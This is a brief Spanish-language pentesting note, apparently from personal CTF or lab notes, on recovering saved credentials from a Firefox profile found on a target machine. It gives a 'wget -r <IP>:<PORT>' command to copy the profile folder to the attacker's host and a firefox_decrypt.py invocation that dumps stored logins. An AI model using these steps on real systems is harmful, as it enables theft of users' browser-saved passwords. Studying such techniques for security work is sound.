---
icon: firefox
---

# Decrypt Firefox

Si en alguna vez se encuentra una carpeta en una maquina llamado algo como `.mozilla/firefox` y dentro de esas ruta puede haber una via potencial para desencriptar `coockies` de inicios de sesion...

URL = [Script Firefox\_decrypt](https://github.com/unode/firefox_decrypt)

Si nos encontramos una carpeta que contiene cosas de `firefox` nos las podemos pasar a neustro `host` utilizando el siguiente comando...

```shell
wget -r <IP>:<PORT>
```

Para descargarte todo el contenido de esa `IP` y de ese puerto...

Y para utilizar la herramienta anterior una vez que tengamos nuestra carpeta entera de `.mozilla/firefox/` haremos lo siguiente con la herramienta...

```shell
python3 firefox_decrypt.py ../firefox/
```

Esto te pedira una contraseña si estuviera protegida la informacion, pero si no te daria las credenciales directamente encontradas...
